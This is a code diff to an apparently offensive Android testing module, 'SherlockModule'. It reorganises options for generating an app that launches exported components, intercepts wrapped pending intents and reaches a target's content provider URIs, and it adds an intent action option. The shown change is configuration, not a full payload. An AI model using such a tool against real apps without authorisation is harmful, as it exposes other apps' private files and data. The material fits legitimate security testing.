@@ -21,22 +21,45 @@ class SherlockModule(App):
 
 
     def register_options(self):
-        option_state.add_options([
-            OptBool("IS_EXPORTED", [True, "Whether the target class is exported (Default: False)", False]),
-            OptBool("VIA_DEEPLINK", [False, "Communicate to target via deeplink (Default: False)", False]),
-            OptStr("DEEPLINK_URI", [False, "Deeplink URI to launch target activity"]),
-            OptStr("PROVIDER_URI", [True, "Content provider URI to access"]),
-            OptStr("TARGET_PACKAGE", [True, "Target package name"]),
-            OptStr("TARGET_CLASS", [False, "Target class name"]),
-            OptStr("PARCEL_EXTRA", [True, "Wrapper intent parcel extra key"]),
-            OptStr("BUNDLE_EXTRA", [False, "Bundle extra key"]),
-            OptStr("BUNDLE_PARCEL", [False, "Parcel bundle key"]),
-            OptStr("WRAPPER_ACTION", [True, "Wrapper intent action to intercept"]),
-            OptStr("BASE_ACTION", [False, "Base intent action to intercept"]),
-            OptInt("REQUEST_CODE", [True, "Pending intent request code"]),
-            OptEnum("PROVIDER_TYPE", [True, "Content provider type (1: Share content, 2: Access to files)", 1, [1, 2]]),
-            OptList("PUT_EXTRA", [False, "Intent extra data"]),
-        ])
+        # option_state.add_options([
+        #     OptBool("IS_EXPORTED", [True, "Whether the target component is exported (Default: False)", False]),
+        #     OptBool("VIA_DEEPLINK", [False, "Communicate to target via deeplink (Default: False)", False]),
+        #     OptStr("DEEPLINK_URI", [False, "Deeplink URI to launch target activity"]),
+        #     OptStr("PROVIDER_URI", [True, "Content provider URI to access"]),
+        #     OptStr("TARGET_PACKAGE", [True, "Target package name"]),
+        #     OptStr("TARGET_CLASS", [False, "Target class name"]),
+        #     OptStr("PARCEL_EXTRA", [True, "Wrapper intent parcel extra key"]),
+        #     OptStr("BUNDLE_EXTRA", [False, "Bundle extra key"]),
+        #     OptStr("BUNDLE_PARCEL", [False, "Parcel bundle key"]),
+        #     OptStr("WRAPPER_ACTION", [True, "Wrapper intent action to intercept"]),
+        #     OptStr("BASE_ACTION", [False, "Base intent action to intercept"]),
+        #     OptInt("REQUEST_CODE", [True, "Pending intent request code"]),
+        #     OptEnum("PROVIDER_TYPE", [True, "Content provider type (1: Share content, 2: Access to files)", 1, [1, 2]]),
+        #     OptList("PUT_EXTRA", [False, "Intent extra data"]),
+        # ])
+
+        option_state.add_options({
+            "exploit": [
+                OptBool("IS_EXPORTED", [True, "Whether the target component is exported (Default: False)", False]),
+                OptBool("VIA_DEEPLINK", [False, "Communicate to target via deeplink (Default: False)", False]),
+                OptStr("DEEPLINK_URI", [False, "Deeplink URI to launch target activity"]),
+                OptStr("TARGET_PACKAGE", [True, "Target package name"]),
+                OptStr("TARGET_CLASS", [False, "Target class name"]),
+                OptStr("ACTION_NAME", [False, "Intent action name"]),
+                OptList("PUT_EXTRA", [False, "Intent extra data key-value pair (Usage: <key>,<value>;<key>,<value>;..)"]),
+            ],
+            "hijack_intent": [
+                OptEnum("PROVIDER_TYPE", [True, "Content provider type [1: Share content, 2: Access to files] (Default: 1)", 1, [1, 2]]),
+                OptStr("PARCEL_EXTRA", [True, "Wrapper intent parcel extra key"]),
+                OptStr("BUNDLE_EXTRA", [False, "Bundle extra key"]),
+                OptStr("BUNDLE_PARCEL", [False, "Parcel bundle key"]),
+                OptStr("PROVIDER_URI", [True, "Content provider URI to access"]),
+                OptStr("WRAPPER_ACTION", [True, "Wrapper intent action to intercept"]),
+                OptStr("BASE_ACTION", [False, "Base intent action to intercept"]),
+                OptInt("REQUEST_CODE", [True, "Pending intent request code"]),
+            ]
+        })
+
         self.update_option_status()
 
 
@@ -64,6 +87,7 @@ class SherlockModule(App):
         provider_uri = opts['PROVIDER_URI']
         target_package = opts['TARGET_PACKAGE']
         target_class = opts['TARGET_CLASS']
+        action_name = opts['ACTION_NAME']
         parcel_extra = opts['PARCEL_EXTRA']
         bundle_extra = opts['BUNDLE_EXTRA']
         bundle_parcel = opts['BUNDLE_PARCEL']
@@ -95,7 +119,7 @@ class SherlockModule(App):
                 intent_filter=wrapper_action,
             ),
             self._template.build_intent(
-                set_action="android.intent.action.VIEW" if via_deeplink else None,
+                set_action="android.intent.action.VIEW" if via_deeplink else action_name if action_name != "" else None,
                 set_data=f'"{deeplink_uri}"' if via_deeplink else None,
                 set_classname=[target_package, target_class] if not via_deeplink else [],
                 put_extra=[[extra[0], f'"{extra[1]}"'] for extra in put_extra] if put_extra != "" else [],
@@ -183,8 +207,8 @@ class SherlockModule(App):
 
         app = {
             "manifest": manifest,
-            "layout": self._template.button_layout(self._id, target_package),
-            "bind_button": self._template.bind_button(self._id, target_package),
+            "layout": self._template.button_layout(self._id, target_package) if is_exported else None,
+            "bind_button": self._template.bind_button(self._id, target_package, exploit_activity_name) if is_exported else None,
             "component": component
         }
 
